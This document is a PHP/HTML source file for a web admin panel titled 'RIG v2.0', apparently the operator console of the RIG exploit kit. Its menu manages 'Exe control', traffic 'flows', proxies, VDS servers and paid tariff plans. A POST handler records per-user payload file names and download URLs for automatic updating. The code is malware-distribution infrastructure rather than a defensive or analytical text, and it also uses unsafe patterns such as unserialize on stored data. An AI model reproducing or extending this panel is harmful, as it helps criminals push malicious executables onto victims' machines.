<?php

header('Content-Type:text/html;charset=UTF-8', true);

function errorHandler($code, $message, $file, $line) {
    debug(array('Error'=>$code,'Message'=>$message,'In file'=>$file,'On line'=>$line));
    exit();
}

function fatalErrorShutdownHandler() {
    $last_error = error_get_last();
    if ($last_error['type'] === E_ERROR) {
    // fatal error
        errorHandler(E_ERROR, $last_error['message'], $last_error['file'], $last_error['line']);
    }
}

//set_error_handler('errorHandler');
//register_shutdown_function('fatalErrorShutdownHandler');


include_once('../config.php');            // take config
include_once('../gears/functions.php');    // connect function
include_once('../gears/di.php');            // connect the class library class names
include_once('../gears/db.php');            // connect the base class

// Create a connection to the database
cdim('db','connect',$config);


// take away from the base of the options and put them in the config
$options = cdim('db','query',"SELECT * FROM options");

// put in the config all that was taken from the database (all options )
if (isset($options)) foreach($options as $k=>$v) {
    $config['options'][$v->option_name]=$v->option_value;
}

// authorization
include_once('./auth/auth.php');


if (isset($_POST['autoupdate_url']) && isset($_POST['autoupdate_filename']) && isset($_POST['autoupdate_user_id']))
  {
  $autoupdate_url = (isset($_POST['autoupdate_url'])) ? addslashes($_POST['autoupdate_url']) : '';
  $autoupdate_filename = isset($_POST['autoupdate_filename']) ? addslashes($_POST['autoupdate_filename']) : '';
  $autoupdate_user_id = isset($_POST['autoupdate_user_id']) ? (int) $_POST['autoupdate_user_id'] : 0;

  $autoupdate_runfile = './autoupdate/autoupdate_runfile_'.$autoupdate_user_id;
  $a_file_arr = array();
  if((filter_var($autoupdate_url, FILTER_VALIDATE_URL) !== FALSE) || ($autoupdate_url == ''))
    {
    if (file_exists($autoupdate_runfile))
      {
      $a_filedata = @file_get_contents($autoupdate_runfile);
      if ($a_filedata !== FALSE)
    {
    $a_file_arr = unserialize($a_filedata);
    }
      }
    $a_file_arr[$autoupdate_filename] = $autoupdate_url;

    @file_put_contents($autoupdate_runfile, serialize($a_file_arr));
    }
  }

?>
<!DOCTYPE html>
<html>
    <head>
        <title>RIG v2.0</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
        <script src="./js/jquery-2.0.0.min.js" charset="utf-8"></script>        
        <script src="./bootstrap/js/bootstrap.js" charset="utf-8"></script>
        <link rel="stylesheet" href="./bootstrap/css/bootstrap.min.css" type="text/css" media="screen" charset="utf-8">
        <link rel="stylesheet" href="./bootstrap/css/bootstrap-responsive.min.css" type="text/css" media="screen" charset="utf-8">
        <link rel="stylesheet" href="./css/adminpanel.css" type="text/css" media="screen" charset="utf-8">
        <link rel="stylesheet" href="./css/toastr-responsive.css" type="text/css">
        <link rel="stylesheet" href="./css/toastr.css" type="text/css">
        <link rel="apple-touch-icon" href="./images/favicon.png" />
        <link rel="shortcut icon" href="./images/favicon.png" />    

        <link rel="stylesheet" href="./css/pickmeup.css" type="text/css" />
        <script type="text/javascript" src="./js/jquery.pickmeup.js"></script>        

        <!-- 4 stat -->
        <script src="./js/knockout-3.0.0.js"></script>
        <script src="./js/globalize.min.js"></script>
        <script src="./js/dx.chartjs.js"></script>

        <script src="./js/jquery.bpopup.min.js"></script>
        <script src="./js/toastr.js" charset="utf-8"></script>
        
        <script>
            // pages
            $(document).ready(function(){
                
                // currentPage look where our hash is
                if (location.hash.replace("#","")) currentPage = location.hash.replace("#",""); else currentPage = 'stats';
                
                // loads the correct page when you first start
                $.ajax({
                    url: './p_'+currentPage+'.php',
                    type: 'POST',
                    dataType: 'HTML',
                    success: function(data) {
                        $('#wrapper').html(data);
                    }
                });
                
                $('ul.menu li a').click(function(event){
                    event.preventDefault(event);
                    if ($(this).attr('rel')===undefined) {
                        document.location.href = $(this).attr('href');
                    } else {
                        pageLoad($(this).attr('rel'),'');
                    }
                });
                
                $('header img').click(function(){
                    pageLoad('stats');
                });
                
                $('.ico_home').click(function(){
                    pageLoad('stats');
                });
                
                $('.ico_reload').click(function(){
                    if (location.hash.replace("#","")) currentPage = location.hash.replace("#",""); else var currentPage = 'stats';
                    pageLoad(currentPage,'');
                });
                
                $('.ico_exit').click(function(){
                    document.location.href='index.php?exit=1';
                });
                
                $('.show-menu').click(function(){
                    $('menu').slideToggle();
                });

                
                //setInterval('showNotify()', 3000);

            });

            function showPopup(what,get) {
                $('#element_to_pop_up').bPopup({
                    closeClass: 'b-close',
                    content:'ajax', //'ajax', 'iframe' or 'image'
                    contentContainer:'.content',
                    loadUrl: what+'?'+get
                });                
            }


            function notify(type,msg) {
                // success  info  warning  error
                var shortCutFunction = type;
                var title = '';
                toastr.options = {
                    fadeIn: 300,
                    fadeOut: 1000,
                    timeOut: 5000,
                    extendedTimeOut: 1000,
                    debug: false,
                    positionClass: 'toast-top-right',
                    onclick: function(){ alert(1); }
                };
                
                var $toast = toastr[shortCutFunction](msg, title); // Wire up an event handler to a button in the toast, if it exists
                
            }


            function showNotify() {

                $.ajax({
                    url: './gears/checkNotify.php',
                    type: 'POST',
                    data: {user_id: <?php echo $config['user']['id'];?> },
                    dataType: 'JSON',
                    success: function(data) {
                        if (data.type!='none') {
                            notify(data.type,data.msg);
                        }
                    }
                });

            };
            
        
            var currentPage;
            
            var sortOrder = 'DESC';
            
            var globalFilters = '';
            // Funk download page
            function pageLoad(page,getParam) {
                $('#menu_item_'+currentPage).css({'background-color': 'transparent'});
                $('#menu_item_'+page).css({'background-color': '#333'});
                currentPage = page;
                // change the hash in the page ( only newer browsers )
                history.pushState({foo: page},'Cool'+page,'/manage/index.php#'+page);

                if (globalFilters!='') {
                    getParam += globalFilters;
                }                

                $('#waitPageModal').modal({show:true,backdrop: 'static',keyboard: false});
                
                $.ajax({
                    url: './p_'+page+'.php?'+getParam+globalFilters,
                    type: 'POST',
                    dataType: 'HTML',
                    success: function(data) {
                    
                    
                        $('#wrapper').addClass('fadeout');
                        window.setTimeout(function(){
                            $('#wrapper').html(data);
                            $('#wrapper').removeClass('fadeout');
                        }, 500);


/*                        $('#wrapper').slideUp(function(){
                            $('#wrapper').html(data);
                            $('#wrapper').slideDown();    
                        });
*/                        
                    }
                });
                return false;
            }            

        
        </script>
    </head>
    <body>


        <!-- Modal -->
        <div class="modal fade" id="waitPageModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
          <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-header">
                <h4 class="modal-title" id="myModalLabel">Page Loading...</h4>
              </div>
              <div class="modal-body">
                <div class="progress progress-striped active">
                  <div class="bar" style="width: 100%;"></div>
                </div>
                <h4 class="text-center">Plz wait...</h4>
              </div>
            </div>
          </div>
        </div>
        
        <div id="element_to_pop_up" style="display:none;border-radius:12px;background-color:white;color:black;max-width:650px;min-width:320px;padding:20px;">
            <div style="position:absolute;top:-10px;right:-10px;background-color:black;color:white;width:20px;height:20px;text-align:center;cursor:pointer;" class="b-close">X</div>
            <div class="content" style="width:100%;"></div>
        </div>
        
        <header>
        
            <img src="./images/logo22.png" width="155" height="160" style="cursor:pointer;" >
            <button class="show-menu btn" data-toggle="collapse" data-target=".nav-collapse">
                <span class="icon-bar" style="background-color: #F5F5F5;color: #FFF;cursor: pointer;display: block;height: 2px;width: 18px;"></span>
                <span class="icon-bar" style="background-color: #F5F5F5;color: #FFF;cursor: pointer;display: block;height: 2px;width: 18px;"></span>
                <span class="icon-bar" style="background-color: #F5F5F5;color: #FFF;cursor: pointer;display: block;height: 2px;width: 18px;"></span>
            </button>
                                    
        </header>
        <menu>
            <div class="hmenu">
                <table width="100%" height="60px" border="0">
                <tr>
                <td align="center"><div class="ico_home"></div></td>
                <td align="center"><div class="ico_reload"></div></td>
                <td align="center"><div class="ico_exit"></div></td>
                </tr>
                </table>
            </div>
            <ul class="menu">
                <?php if ($config['user']['rights']['pages']['p_stats']['is']=='on') { ?>
                    <li><a href="#" id="menu_item_stats" rel="stats"><span>Main stats</span></a></li>
                <?php } ?>

                <?php if ($config['user']['rights']['pages']['p_vds']['is']=='on') { ?>
                    <li><a href="#" id="menu_item_vds" rel="vds"><span>VDS</span></a></li>
                <?php } ?>

                <?php if ($config['user']['rights']['pages']['p_files']['is']=='on') { ?>
                    <li><a href="#" id="menu_item_files" rel="files"><span>Exe control</span></a></li>
                <?php } ?>


                <?php if ($config['user']['rights']['pages']['p_proxy']['is']=='on') { ?>
                    <li><a href="#" id="menu_item_proxy" rel="proxy"><span>Proxy</span></a></li>
                <?php } ?>

                <?php if ($config['user']['rights']['pages']['p_flows']['is']=='on') { ?>
                    <li><a href="#" id="menu_item_flows" rel="flows"><span>Get flow</span></a></li>
                <?php } ?>

                <?php if ($config['user']['rights']['pages']['p_tarif']['is']=='on') { ?>
                    <li><a href="#" id="menu_item_tarif" rel="tarif"><span>Tarifs plan</span></a></li>
                <?php } ?>
                
                <?php if ($config['user']['rights']['pages']['p_options']['is']=='on') { ?>
                    <li><a href="#" id="menu_item_options" rel="options"><span>Settings</span></a></li>
                <?php } ?>
                
                <?php if ($config['user']['rights']['pages']['p_users']['is']=='on') { ?>
                    <li><a href="#" id="menu_item_users" rel="users"><span>Users</span></a></li>
                <?php } ?>
                
                <li><a href='index.php?exit=1'><span>Exit</span></a></li>
            </ul>
            
            <div class="hmenu">
                <table width="100%" height="60px" border="0">
                <tr>
                <td align="center"><div class="ico_home"></div></td>
                <td align="center"><div class="ico_reload"></div></td>
                <td align="center"><div class="ico_exit"></div></td>
                </tr>
                </table>
            </div>
        
            <div id="copy"></div>
        </menu>
        <div id="content">
            <div id="wrapper">
            </div>
        </div>
    </body>
</html>